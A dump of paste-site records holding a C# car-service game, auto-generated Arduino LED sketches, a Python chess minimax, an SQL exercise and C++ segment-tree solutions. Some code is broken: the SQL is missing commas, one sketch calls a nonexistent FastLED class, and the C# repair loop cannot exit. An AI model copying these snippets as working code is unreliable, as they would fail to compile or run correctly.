        public void ReplaceDetail(Detail newDetail)
        {
            for (int i = 0; i < _details.Count; i++)
            {
                if (_details[i].Type == newDetail.Type)
                {
                    _details[i] = newDetail;

                    return;
                }
            }
        }

        private void MakeDefectiveDetails()
        {
            int maxNumberDetails = 5;
            int numberDefectiveParts = Utilities.GetRandomNumber(1, maxNumberDetails);

            for (int i = 0; i < numberDefectiveParts; i++)
            {
                int randomIndexDetail = Utilities.GetRandomNumber(1, _details.Count);
                _details[randomIndexDetail - 1].MakeDefective();
            }
        }
    }

    class CarCreator
    {
        private Queue<Car> _cars = new Queue<Car>();

        private DetailCreator _detailCreator;

        public CarCreator(DetailCreator detailCreator)
        {
            _detailCreator = detailCreator;
            FillQueue();
        }

        public Queue<Car> ReturnQueue()
        {
            return new Queue<Car>(_cars);
        }

        private void FillQueue()
        {
            int maxNumberInQueue = 7;
            int randomNumberInQueue = Utilities.GetRandomNumber(1, maxNumberInQueue);

            for (int i = 0; i < randomNumberInQueue; i++)
            {
                _cars.Enqueue(CreateForQueue());
            }
        }

        private Car CreateForQueue()
        {
            List<Detail> details = new List<Detail>();

            for (int j = 0; j < _detailCreator.DetailsCount; j++)
            {
                details.Add(_detailCreator.ReturnListAll()[j].Clone());
            }

            return new Car(details);
        }
    }

    class Detail
    {
        public Detail(int price, string type, bool isBroken)
        {
            Price = price;
            Type = type;
            IsBroken = isBroken;
        }

        public int Price { get; private set; }
        public string Type { get; private set; }
        public bool IsBroken { get; private set; }

        public void ShowInfo()
        {
            Console.WriteLine($""Деталь {Type}, стоимость {Price}, состояние {GetStatus()}"");
        }

        public void MakeDefective()
        {
            IsBroken = true;
        }

        public string GetStatus()
        {
            return IsBroken ? ""Неисправно"" : ""Исправно"";
        }

        public Detail Clone()
        {
            return new Detail(Price, Type, IsBroken);
        }
    }

    class DetailCreator
    {
        private List<Detail> _details;

        public DetailCreator()
        {
            _details = new List<Detail>
            {
                new Detail (3000, ""Масляный насос"", false),
                new Detail (1500, ""Клапаны"", false),
                new Detail (1500, ""Ремень"", false),
                new Detail (1000, ""Маховик"", false),
                new Detail (2000, ""Водяной насос"", false),
                new Detail (2200, ""Блок цилиндров"", false),
                new Detail (4000, ""Масляный фильтр"", false),
                new Detail (2800, ""Воздушный фильтр"", false),
                new Detail (5000, ""Генератор"", false),
                new Detail (500, ""Стартер"", false),
            };
        }

        public int DetailsCount => _details.Count;

        public List<Detail> ReturnListAll()
        {
            return new List<Detail>(_details);
        }
    }

    class Warehouse
    {
        private DetailCreator _detailCreator;

        private List<Detail> _details = new List<Detail>();

        public Warehouse(DetailCreator detailCreator)
        {
            _detailCreator = detailCreator;
        }

        public int DetailsCount => _details.Count;

        public void RemoveDetail(string detailType)
        {
            for (int i = 0; i < _details.Count; i++)
            {
                if (_details[i].Type == detailType)
                {
                    _details.RemoveAt(i);
                    break;
                }
            }
        }

        public Detail GetDetailByIndex(int index)
        {
            return _details[index];
        }

        public void ShowAssortment()
        {
            Console.WriteLine(""\nДетали на складе:\n"");

            for (int i = 0; i < _details.Count; i++)
            {
                Console.Write($""№ {i + 1} "");
                _details[i].ShowInfo();
            }
        }

        public void FillDetails()
        {
            int capacity = 15;
            int minNumber = 0;
            int maxNumber = _detailCreator.DetailsCount;

            for (int i = 0; i < capacity; i++)
            {
                int randomNumber = Utilities.GetRandomNumber(minNumber, maxNumber - 1);

                _details.Add(_detailCreator.ReturnListAll()[randomNumber]);
            }
        }
    }

    class CarService
    {
        private Warehouse _warehouse;

        private Queue<Car> _cars;

        private int _fine = 1000;
        private int _fineSkipping = 300;
        private int _income = 0;

        public CarService(Queue<Car> cars, Warehouse warehouse)
        {
            _cars = cars;
            _warehouse = warehouse;
        }

        public void Work()
        {
            while (_cars.Count > 0)
            {
                Car car = _cars.Dequeue();

                RepairCar(car);
            }

            Console.WriteLine(""В очереди больше нет машин на ремонт.\nПрограмма завершена"");
        }

        private void RepairCar(Car car)
        {
            const string CommandComplete = ""S"";

            bool isWork = true;

            while (isWork)
            {
                Console.WriteLine($""\nКапитал автосервиса: {_income}\n"");

                car.ShowDetails();
                Console.WriteLine();

                _warehouse.ShowAssortment();
                Console.WriteLine();

                car.ShowBrokenDetails();

                Console.WriteLine($""\nВведите {CommandComplete} чтобы завершить обслуживание текущего автомобиля"");
                Console.WriteLine(""Введите номер детали со склада для починки автомобиля:\n"");

                string userInput = Console.ReadLine();

                CompleteCarMaintenance(car, userInput, CommandComplete, isWork);
                
                if (int.TryParse(userInput, out int number))
                {
                    if (number > 0 && number <= _warehouse.DetailsCount)
                    {
                        Detail warehouseDetail = _warehouse.GetDetailByIndex(number - 1);

                        if (car.TryGetDetail(warehouseDetail.Type, out Detail detail))
                        {
                            MakeProfit(detail.Price);

                            car.ReplaceDetail(warehouseDetail);

                            _warehouse.RemoveDetail(detail.Type);
                        }
                        else
                        {
                            _warehouse.RemoveDetail(warehouseDetail.Type);
                            PayForMistake();
                        }
                    }
                    else
                    {
                        Console.WriteLine(""\nНет детали под таким номером\n"");
                    }
                }
                else if(isWork == false)
                {
                    Console.WriteLine(""Неверный ввод команды"");
                }
            }
        }

        private void CompleteCarMaintenance(Car car, string userInput, string commandComplete, bool isWork)
        {
            if (userInput == commandComplete && car.HaveBrokenDetail())
            {
                PayBrokenDetailFine(car.ReturnDetails());
                isWork = false;
            }
            else if (userInput == commandComplete)
            {
                Console.WriteLine(""Обслуживание текущего автомобиля завершено"");
                isWork = false;
            }
        }

        private void PayForMistake()
        {
            _income -= _fine;

            Console.WriteLine($""Получен штраф {_fine} за замену исправной детали, вы утратили исправную деталь со склада\n"");
        }

        private void PayBrokenDetailFine(List<Detail> details)
        {
            int sum = 0;
            int numberDetail = 0;

            for (int i = 0; i < details.Count; i++)
            {
                if (details[i].IsBroken == true)
                {
                    _income -= _fineSkipping;
                    numberDetail++;
                    sum += _fineSkipping;
                }
            }

            Console.WriteLine($""Получен штраф {sum} за {numberDetail} непочиненные детали\n"");
        }

        private void MakeProfit(int price)
        {
            int difference = 100;
            int extraChargePercent = 30;
            int priceWork = (price * extraChargePercent) / difference;
            _income += price + priceWork;

            Console.WriteLine($""Получена прибыль {price}. Наценка за ремонт {extraChargePercent}% от детали {priceWork}"");
        }
    }
}

"
hNwR0xRW,FastLED Control rev_09,pleasedontcode,Arduino,Saturday 4th of May 2024 04:35:44 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: FastLED Control
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2024-05-04 09:30:50

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* output d5  number of led 20  ws2812B RGB  use */
	/* random color  fade in and out in 10 seconds */
/****** SYSTEM REQUIREMENT 2 *****/
	/* output d5  ws2812B  number of LED 20  each LED */
	/* random color  use 256 colors  each LED random */
	/* brightness from 0 to 255  each LED fading in and */
	/* out random speed */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <FastLED.h>  // https://github.com/FastLED/FastLED

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void updateOutputs(void);
void randomFadeInOut(void);
void randomFadingLEDs(void);

/***** DEFINITION OF DIGITAL OUTPUT PINS *****/
const uint8_t LED_PIN_D5 = 5;

/***** DEFINITION OF OUTPUT RAW VARIABLES *****/
bool LED_PIN_D5_rawData = 0;

/***** DEFINITION OF OUTPUT PHYSICAL VARIABLES *****/
float LED_PIN_D5_phyData = 0.0;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
#define NUM_LEDS 20
#define DATA_PIN 5
#define BRIGHTNESS 50

CRGB leds[NUM_LEDS];
FastLED_NeoPixel_Variant strip(leds, NUM_LEDS);

void setup(void)
{
    // put your setup code here, to run once:
    pinMode(LED_PIN_D5, OUTPUT);

    strip.begin(FastLED.addLeds<WS2812B, DATA_PIN, RGB>(leds, NUM_LEDS));
    strip.setBrightness(BRIGHTNESS);
}

void loop(void)
{
    // put your main code here, to run repeatedly:
    randomFadeInOut(); // System Requirement 1
    randomFadingLEDs(); // System Requirement 2
    updateOutputs(); // Refresh output data
}

void updateOutputs(void)
{
    digitalWrite(LED_PIN_D5, LED_PIN_D5_rawData);
}

void randomFadeInOut(void)
{
    // Random color fade in and out in 10 seconds for LED connected to D5
    // Implement the code for System Requirement 1 here
    for (int i = 0; i < 256; i++) {
        uint8_t brightness = i;
        leds[0] = CHSV(random8(), 255, brightness);
        FastLED.show();
        delay(40);
    }
    for (int i = 255; i >= 0; i--) {
        uint8_t brightness = i;
        leds[0] = CHSV(random8(), 255, brightness);
        FastLED.show();
        delay(40);
    }
}

void randomFadingLEDs(void)
{
    // Random color, brightness, and fading in and out for each LED connected to D5
    // Implement the code for System Requirement 2 here
    for (int i = 0; i < NUM_LEDS; i++) {
        uint8_t brightness = random8();
        leds[i] = CHSV(random8(), 255, brightness);
    }
    FastLED.show();
    delay(random(100, 1000));
}
"
CNEcTp3n,RGB LED Fader rev_08,pleasedontcode,Arduino,Saturday 4th of May 2024 04:19:16 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: RGB LED Fader
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2024-05-04 09:18:13

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* output d5  number of led 20  ws2812B RGB  use */
	/* random color  fade in and out in 10 seconds */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <FastLED.h>	//https://github.com/FastLED/FastLED

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void updateOutputs(void);

/***** DEFINITION OF DIGITAL OUTPUT PINS *****/
const uint8_t LEDBoard_LEDRGB_Red_PIN_D5	= 5; // Output pin for WS2812B RGB LED strip
#define NUM_LEDS 20 // Number of LEDs in the strip

/***** DEFINITION OF OUTPUT RAW VARIABLES *****/
/***** used to store raw data *****/
bool	LEDBoard_LEDRGB_Red_PIN_D5_rawData = 0;

// Define LED strip parameters
#define DATA_PIN 6
#define LED_TYPE WS2812B
#define COLOR_ORDER GRB

CRGB leds[NUM_LEDS];

void setup(void)
{
	// put your setup code here, to run once:

	FastLED.addLeds<LED_TYPE, DATA_PIN, COLOR_ORDER>(leds, NUM_LEDS);
	pinMode(LEDBoard_LEDRGB_Red_PIN_D5, OUTPUT);

}

void loop(void)
{
	// put your main code here, to run repeatedly:

	// Random color fade in and out in 10 seconds
	uint8_t brightness = beatsin8(60, 0, 255);
	uint8_t hue = beatsin8(40, 0, 255);
	fill_solid(leds, NUM_LEDS, CHSV(hue, 255, brightness));
	FastLED.show();
	delay(100); // Adjust the delay time for fade effect

}

void updateOutputs()
{
	digitalWrite(LEDBoard_LEDRGB_Red_PIN_D5, LEDBoard_LEDRGB_Red_PIN_D5_rawData);
}
"
adZSDQRd,10 moves rule Petre,max2201111,Python,Saturday 4th of May 2024 04:15:44 AM CDT,"import chess
import ast

def simplify_fen_string(fen):
    parts = fen.split(' ')
    simplified_fen = ' '.join(parts[:4])  # Retaining position, turn, castling rights, and en passant
    return simplified_fen

def ten_moves_rule(board):
    """"""Custom rule to evaluate a draw condition based on the last ten moves.""""""
    history = list(board.move_stack)
    if len(history) < 10:
        return False
    for move in history[-10:]:
        if board.is_capture(move):
            return False
    
    print(""H"")    
    return True

def evaluate_board(board, depth):
    if board.is_checkmate():
        return -1000 + depth if board.turn == chess.WHITE else 1000 - depth
    elif board.is_stalemate() or board.is_insufficient_material() or ten_moves_rule(board):
        return 0
    return 0

def minimax(board, depth, alpha, beta, maximizing_player, depth2, depths, position_count, memo):
    position_count[0] += 1
    if position_count[0] % 1000000 == 0:
        print(f""Explored {position_count[0]} positions."")

    key = (board.fen(), maximizing_player, depth, alpha, beta)
    if key in memo:
        return memo[key]

    if depth == 0 or board.is_game_over():
        eval = evaluate_board(board, depth2)
        memo[key] = (None, eval)
        return None, eval

    best_move = None
    if maximizing_player:
        max_eval = float('-inf')
        for move in board.legal_moves:
            board.push(move)
            _, eval = minimax(board, depth - 1, alpha, beta, False, depth2 + 1, depths, position_count, memo)
            board.pop()
            if eval > max_eval:
                max_eval = eval
                best_move = move
            alpha = max(alpha, eval)
            if beta <= alpha:
                break
        memo[key] = (best_move, max_eval)

        if depth2 not in depths:
            depths.append(depth2)
            print(f""Depth of recursion: {depth2}"")

        return best_move, max_eval
    else:
        min_eval = float('inf')
        for move in board.legal_moves:
            board.push(move)
            _, eval = minimax(board, depth - 1, alpha, beta, True, depth2 + 1, depths, position_count, memo)
            board.pop()
            if eval < min_eval:
                min_eval = eval
                best_move = move
            beta = min(beta, eval)
            if beta <= alpha:
                break
        memo[key] = (best_move, min_eval)

        if depth2 not in depths:
            depths.append(depth2)
            print(f""Depth of recursion: {depth2}"")

        return best_move, min_eval

# Initialization and main execution logic
start_fen = ""8/4Q1K1/8/8/3k4/8/2q5/8 w - - 0 1""

start_fen = ""8/4Q1K1/8/8/3k4/8/2q5/8 w - - 0 1""


board = chess.Board(start_fen)
depths = []
position_count = [0]
memo = {}

best_move, best_score = minimax(board, 52, float('-inf'), float('inf'), True, 0, depths, position_count, memo)
if best_move:
    move_san = board.san(best_move)
    print(f""The best move from position {start_fen} is {move_san} with a score of {best_score}."")
else:
    print(""No move found, or the game is over. Score: "", best_score)"
6cmpPSZp,Untitled,moroccanrabbit97,SQL,Saturday 4th of May 2024 03:49:36 AM CDT,"--prikazati sljedece podatke: id, ime i preime djelatnika, id odjela, placu djelatnika
-- razliku place djelatnika u odnosu na prosjecnu placu odjela kojem pripada
-- razliku place djelatnika u odnosu na prosjecnu placu radnog mjesta kojem pripada

with
agr_dpt as
(select department_id, round(avg (salary), 2) as prosj_pl_dpt
from employees
group by department_id), --ono po cemu grupiramo ide i u SELECT

agr_job as
(select job_id, round(avg (salary), 2) as prosj_pl_job
from employees
group by job_id)
select e.employee_id, e.first_name, e.last_name, e.department_id, e.salary, ad.prosj_pl_dpt, e.salary - ad.prosj_pl_dpt as razlika_dpt
e.salary -aj.prosj_pl_job as razlika.job e.job_id
from employees e join agr_dpt ad on e.department_id = ad.department_id
    join agr_job aj on e.job_id = aj.job_id
order by 1;"
bpRQ1WLa,Temperature Control rev_01,pleasedontcode,Arduino,Saturday 4th of May 2024 03:29:15 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Temperature Control
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2024-05-04 08:22:30

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Turn light on off */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <DS18B20.h>
#include <MCP23017.h>

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t Test_DS18B20_DQ_PIN_D2 = 2;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
DS18B20 ds(Test_DS18B20_DQ_PIN_D2);
MCP23017 ioExpander;

void setup(void)
{
	// Initialize MCP23017
	ioExpander.begin();

	// Set pin modes for MCP23017
	ioExpander.pinMode(8, INPUT_PULLUP); // Replace pin numbers as required
	ioExpander.pinMode(9, INPUT_PULLUP);
	ioExpander.pinMode(0, OUTPUT);
	ioExpander.pinMode(1, OUTPUT);

	// Set initial digital outputs
	ioExpander.digitalWrite(0, LOW);
	ioExpander.digitalWrite(1, LOW);
}

void loop(void)
{
	// Check input pin value and update output pins on the MCP23017
	ioExpander.digitalWrite(0, !ds.getTempC());  // Placeholder logic - change as needed
	ioExpander.digitalWrite(1, ds.getTempC());   // Placeholder logic - change as needed
}

/* END CODE */"
BTn0yQMs,Untitled,ekzolot,C++,Saturday 4th of May 2024 03:07:49 AM CDT,"//A
#include <bits/stdc++.h>
using namespace std;
struct Note{
    int l;
    int r;
    int ans;
    int d=0;
};
void build(vector<Note>& tree, vector<int>& a, int L, int R, int i){
    tree[i].l=L;
    tree[i].r=R;
    if (R-L==1){
        tree[i].ans=a[L];
        return;
    }
    int M=(R+L)/2;
    build(tree, a, L, M, 2*i+1);
    build(tree, a, M, R, 2*i+2);
    tree[i].ans=max(tree[2*i+1].ans, tree[2*i+2].ans);
}
void push(vector<Note>& tree, int i){
    tree[2*i+1].d+=tree[i].d;
    tree[2*i+2].d+=tree[i].d;
    tree[i].d=0;
}
void change(vector<Note>& tree, int i, int x, int L, int R){
    if (tree[i].l>=R || tree[i].r<=L){
        return;
    }
    if(tree[i].l>=L && tree[i].r<=R){
        tree[i].d+=x;
        return;
    }
    push(tree, i);
    change(tree, 2*i+1, x, L, R);
    change(tree, 2*i+2, x, L, R);
    tree[i].ans=max(tree[2*i+1].ans+tree[2*i+1].d, tree[2*i+2].ans+tree[2*i+2].d);
}
int answer(vector<Note>& tree, int i, int L, int R){
    if (tree[i].l>=R || tree[i].r<=L){
        return -1;
    }
    if(tree[i].l>=L && tree[i].r<=R){
        return tree[i].ans+tree[i].d;
    }
    push(tree, i);
    int m1=answer(tree, 2*i+1, L, R);
    int m2=answer(tree, 2*i+2, L, R);
    tree[i].ans=max(tree[2*i+1].ans+tree[2*i+1].d, tree[2*i+2].ans+tree[2*i+2].d);
    return max(m1, m2);
}
int main(){
    int n;
    cin>>n;
    vector<int> a(n);
    for (int i=0; i<n; i++){
        cin>>a[i];
    }
    vector<Note> tree(4*n);
    build(tree, a, 0, n, 0);
    int M;
    cin>>M;
    for (int i=0; i<M; i++){
        char x;
        cin>>x;
        if (x=='a'){
            int L, R, add;
            cin>>L>>R>>add;
            L--;
            change(tree, 0, add, L, R);
        }else{
            int L, R;
            cin>>L>>R;
            L--;
            cout<<answer(tree, 0, L, R)<<"" "";
        }
    }
    return 0;
}


//B
#include <bits/stdc++.h>
#define int long long
using namespace std;
struct Note{
    int pref;
    int suf;
    int ans;
};
void build(vector<Note>& tree, vector<int>& a, int v, int l, int r){
    if (r-l==1){
        if (a[l]==0){
            tree[v].pref=1;
            tree[v].suf=1;
            tree[v].ans=1;
        }else{
            tree[v].pref=0;
            tree[v].suf=0;
            tree[v].ans=0;
        }
        return;
    }
    int m=(l+r)/2;
    build(tree, a, 2*v+1, l, m);
    build(tree, a, 2*v+2, m, r);
    tree[v].ans=tree[2*v+1].suf+tree[2*v+2].pref;
    tree[v].ans=max(tree[v].ans, tree[2*v+1].ans);
    tree[v].ans=max(tree[v].ans, tree[2*v+2].ans);
    if (tree[2*v+2].ans==r-m){
        tree[v].suf=tree[2*v+1].suf+r-m;
    }else{
        tree[v].suf=tree[2*v+2].suf;
    }
    if (tree[2*v+1].ans==m-l) {
        tree[v].pref = m - l + tree[2 * v + 2].pref;
    }else{
        tree[v].pref=tree[2*v+1].pref;
    }
}
void change(vector<Note>& tree, vector<int>& a, int v, int l, int r, int pos, int x){
    if (r-l==1){
        if (x==0){
            tree[v].pref=1;
            tree[v].suf=1;
            tree[v].ans=1;
        }else{
            tree[v].pref=0;
            tree[v].suf=0;
            tree[v].ans=0;
        }
        return;
    }
    int m=(r+l)/2;
    if (pos<m){
        change(tree, a, 2*v+1, l, m, pos, x);
    }else{
        change(tree, a, 2*v+2, m,r, pos, x);
    }
    tree[v].ans=tree[2*v+1].suf+tree[2*v+2].pref;
    tree[v].ans=max(tree[v].ans, tree[2*v+1].ans);
    tree[v].ans=max(tree[v].ans, tree[2*v+2].ans);
    if (tree[2*v+2].ans==r-m){
        tree[v].suf=tree[2*v+1].suf+r-m;
    }else{
        tree[v].suf=tree[2*v+2].suf;
    }
    if (tree[2*v+1].ans==m-l) {
        tree[v].pref = m - l + tree[2 * v + 2].pref;
    }else{
        tree[v].pref=tree[2*v+1].pref;
    }
}
int ans(vector<Note>& tree, vector<int>& a, int v, int l, int r, int L, int R){
    if (L>=r || R<=l){
        return 0;
    }
    if (L<=l && R>=r){
        //cout<<l<<"" ""<<r<<"" ""<<L<<"" ""<<R<<"" ""<<tree[v].ans<<""\n"";
        return tree[v].ans;
    }
    int m=(r+l)/2;
    if (L<=m && R<=m){
        return ans(tree, a, 2*v+1, l, m, L, R);
    }
    if (L>=m && R>=m){
        return ans(tree, a, 2*v+2, m, r, L, R);
    }
    //cout<<l<<"" ""<<r<<"" ""<<L<<"" ""<<R<<"" ""<<min(m-L, tree[2*v+1].suf)+min(R-m, tree[2*v+2].pref)<<""\n"";
    int y=min(m-L, tree[2*v+1].suf)+min(R-m, tree[2*v+2].pref);
    y=max(y, ans(tree, a, 2*v+1, l, m, L, R));
    y=max(y, ans(tree, a, 2*v+2, m, r, L, R));
    return y;
}
signed main(){
    int N;
    cin>>N;
    if (N<10000){
        vector<int> q(N);
        for (int i=0; i<N; i++){
            cin>>q[i];
        }
        int m;
        cin>>m;
        while(m--){
            char type;
            cin>>type;
            if (type=='+'){
                int L, R, d;
                cin>>L>>R>>d;
                L--;
                for (int i=L; i<R; i++){
                    q[i]+=d;
                }
            }else{
                int L, R;
                cin>>L>>R;
                L--;
                int ans=0;
                int cnt=0;
                for (int i=L; i<R-1; i++){
                    if (q[i+1]-q[i]!=1){
                        cnt=0;
                    }else{
                        cnt++;
                    }
                    ans=max(ans, cnt);
                }
                cout<<ans+1<<""\n"";
            }
        }
        return 0;
    }
    vector<int> b(N);
    for (int i=0; i<N; i++) {
        cin>>b[i];
    }
    int n=N-1;
    vector<int> a(n);
    for (int i=0; i<n; i++){
        a[i]=b[i+1]-b[i]-1;
    }
    vector<Note> tree(4*n);
    build(tree, a, 0, 0, n);
    int m;
    cin>>m;
    while(m--){
        char type;
        cin>>type;
        if (type=='+'){
            int L, R, d;
            cin>>L>>R>>d;
            L--;
            if (L-1>=0 && L-1<n){
                a[L-1]+=d;
                change(tree, a, 0, 0, n, L-1, a[L-1]);
            }
            if (R-1<n && R-1>=0){
                a[R-1]-=d;
                change(tree, a, 0, 0, n, R-1, a[R-1]);
            }
        }
        else{
            int L, R;
            cin>>L>>R;
            L--;
            if (L==n || L==R-1){
                cout<<1<<""\n"";
                continue;
            }
            cout<<ans(tree, a, 0, 0, n, L, R-1)+1<<""\n"";
        }
    }
    return 0;
}


//C
#include <bits/stdc++.h>
#define int long long
using namespace std;
struct Note{
    vector<int> v;
    int l;
    int r;
    int d=0;
};
vector<int> binary_rep(int x){
    vector<int> ans;
    while(x>0){
        ans.push_back(x%2);
        x/=2;
    }
    while(ans.size()<40){
        ans.push_back(0);
    }
    reverse(ans.begin(), ans.end());
    return ans;
}
void unite(vector<int>& vert, vector<int>& left, vector<int>& right){
    for (int i=0; i<40; i++){
        vert[i]=left[i]+right[i];
    }
}
void build(vector<Note>& tree, int idx, int L, int R, vector<vector<int>>& a){
    (tree[idx].v).resize(40);
    tree[idx].l=L;
    tree[idx].r=R;
    if (R-L==1){
        tree[idx].v=a[L];
        return;
    }
    int M=(L+R)/2;
    build(tree, 2*idx+1, L, M, a);
    build(tree, 2*idx+2, M, R, a);
    unite(tree[idx].v, tree[2*idx+1].v, tree[2*idx+2].v);
}
void push(vector<Note>& tree, int idx){
    tree[2*idx+1].d=tree[idx].d^tree[2*idx+1].d;
    tree[2*idx+2].d=tree[idx].d^tree[2*idx+2].d;
    tree[idx].d=0;
}
vector<int> counting_vector(vector<int>& ans, int x, int k){
    vector<int> cnt(40);
    for (int i=0; i<40; i++){
        if (!((x>>(39-i))&1)){
            cnt[i]=ans[i];
        }else{
            cnt[i]=k-ans[i];
        }
    }
    return cnt;
}
void change(vector<Note>& tree, int idx, int L, int R, int x){
    if (tree[idx].l>=R || tree[idx].r<=L){
        return;
    }
    if (L<=tree[idx].l && R>=tree[idx].r){
        tree[idx].d=tree[idx].d^x;
        return;
    }
    push(tree, idx);
    change(tree, 2*idx+1, L, R, x);
    change(tree, 2*idx+2, L, R, x);
    int len1=tree[2*idx+1].r-tree[2*idx+1].l;
    int len2=tree[2*idx+2].r-tree[2*idx+2].l;
    vector<int> y1=counting_vector(tree[2*idx+1].v, tree[2*idx+1].d, len1);
    vector<int> y2=counting_vector(tree[2*idx+2].v, tree[2*idx+2].d, len2);
    unite(tree[idx].v, y1, y2);
}
int counting(vector<int>& ans, int x, int k){
    int cnt=0;
    for (int i=0; i<40; i++){
        if (!((x>>(39-i))&1)){
            cnt+=ans[i]*(1<<(39-i));
        }else{
            cnt+=(1<<(39-i))*(k-ans[i]);
        }
    }
    return cnt;
}
int answer(vector<Note>& tree, int idx, int L, int R){
    if (L>=tree[idx].r || R<=tree[idx].l){
        return 0;
    }
    if (L<=tree[idx].l && R>=tree[idx].r){
        int len=tree[idx].r-tree[idx].l;
        return counting(tree[idx].v, tree[idx].d, len);
    }
    push(tree, idx);
    int len1=tree[2*idx+1].r-tree[2*idx+1].l;
    int len2=tree[2*idx+2].r-tree[2*idx+2].l;
    vector<int> y1=counting_vector(tree[2*idx+1].v, tree[2*idx+1].d, len1);
    vector<int> y2=counting_vector(tree[2*idx+2].v, tree[2*idx+2].d, len2);
    unite(tree[idx].v, y1, y2);
    return answer(tree, 2*idx+1, L, R)+answer(tree, 2*idx+2, L, R);
}
signed main(){
    ios::sync_with_stdio(0);
    cin.tie(0);
    cout.tie(0);
    int n;
    cin>>n;
    vector<vector<int>> a(n);
    for (int i=0; i<n; i++){
        int q;
        cin>>q;
        a[i]=binary_rep(q);
    }
    int m;
    cin>>m;
    vector<Note> tree(4*n);
    build(tree, 0, 0, n, a);
    while(m--){
        int t;
        cin>>t;
        if (t==1){
            int L, R;
            cin>>L>>R;
            L--;
            cout<<answer(tree, 0, L, R)<<""\n"";
        }
        else{
            int L, R, x;
            cin>>L>>R>>x;
            L--;
            change(tree, 0, L, R, x);
        }
    }
    return 0;
}
"
UmWcBtV0,Untitled,ekzolot,C++,Saturday 4th of May 2024 03:05:46 AM CDT,"//A
#include <bits/stdc++.h>
using namespace std;
void build(vector<pair<int, int>>& tree, int idx, int l, int r, vector<int>& a){
    if (r-l==1){
        tree[idx]={a[l], l};
        return;
    }
    int m=(l+r)/2;
    build(tree, 2*idx+1, l, m, a);
    build(tree, 2*idx+2, m, r, a);
    tree[idx]=max(tree[2*idx+1], tree[2*idx+2]);
}
void change(vector<pair<int, int>>& tree, int l, int r, int idx, int i, int x){
    if (i<l || i>=r){
        return;
    }
    if (r-l==1){
        tree[idx]={x, i};
        return;
    }
    int m=(l+r)/2;
    change(tree, l, m, 2*idx+1, i, x);
    change(tree, m, r, 2*idx+2, i, x);
    tree[idx]=max(tree[2*idx+1], tree[2*idx+2]);
}
pair<int, int> ans(vector<pair<int, int>>& tree, int idx, int l, int r, int L, int R){
    if (R<=l || L>=r){
        return {-1, -1};
    }
    if (l>=L && r<=R){
        return tree[idx];
    }
    int m=(l+r)/2;
    return max(ans(tree, 2*idx+1, l, m, L, R), ans(tree, 2*idx+2, m, r, L, R));
}
int main(){
    int n;
    cin>>n;
    vector<int> a(n);
    for (int i=0; i<n; i++){
        cin>>a[i];
    }
    int k;
    cin>>k;
    vector<pair<int, int>> tree(4*n);
    build(tree, 0, 0, n, a);
    while(k--){
        int l, r;
        cin>>l>>r;
        l--;
        cout<<ans(tree, 0, 0, n, l, r).first<<"" ""<<ans(tree, 0, 0, n, l, r).second+1<<""\n"";
    }
    return 0;
}

//B
#include <bits/stdc++.h>
using namespace std;
void build(vector<pair<int, int>>& tree, int idx, int l, int r, vector<int>& a){
    if (r-l==1){
        tree[idx]={a[l], l};
        return;
    }
    int m=(l+r)/2;
    build(tree, 2*idx+1, l, m, a);
    build(tree, 2*idx+2, m, r, a);
    tree[idx]=max(tree[2*idx+1], tree[2*idx+2]);
}
void change(vector<pair<int, int>>& tree, int l, int r, int idx, int i, int x){
    if (i<l || i>=r){
        return;
    }
    if (r-l==1){
        tree[idx]={x, i};
        return;
    }
    int m=(l+r)/2;
    change(tree, l, m, 2*idx+1, i, x);
    change(tree, m, r, 2*idx+2, i, x);
    tree[idx]=max(tree[2*idx+1], tree[2*idx+2]);
}
pair<int, int> ans(vector<pair<int, int>>& tree, int idx, int l, int r, int L, int R){
    if (R<=l || L>=r){
        return {-1, -1};
    }
    if (l>=L && r<=R){
        return tree[idx];
    }
    int m=(l+r)/2;
    return max(ans(tree, 2*idx+1, l, m, L, R), ans(tree, 2*idx+2, m, r, L, R));
}
int main(){
    ios::sync_with_stdio(0);
    cin.tie(0);
    cout.tie(0);
    int n;
    cin>>n;
    vector<int> a(n);
    for (int i=0; i<n; i++){
        cin>>a[i];
    }
    int k;
    cin>>k;
    vector<pair<int, int>> tree(4*n);
    build(tree, 0, 0, n, a);
    while(k--){
        int l, r;
        cin>>l>>r;
        l--;
        cout<<ans(tree, 0, 0, n, l, r).second+1<<""\n"";
    }
    return 0;
}

//C
#include <bits/stdc++.h>
using namespace std;
struct Note{
    int pref;
    int suf;
    int ans;
};
void build(vector<Note>& tree, vector<int>& a, int v, int l, int r){
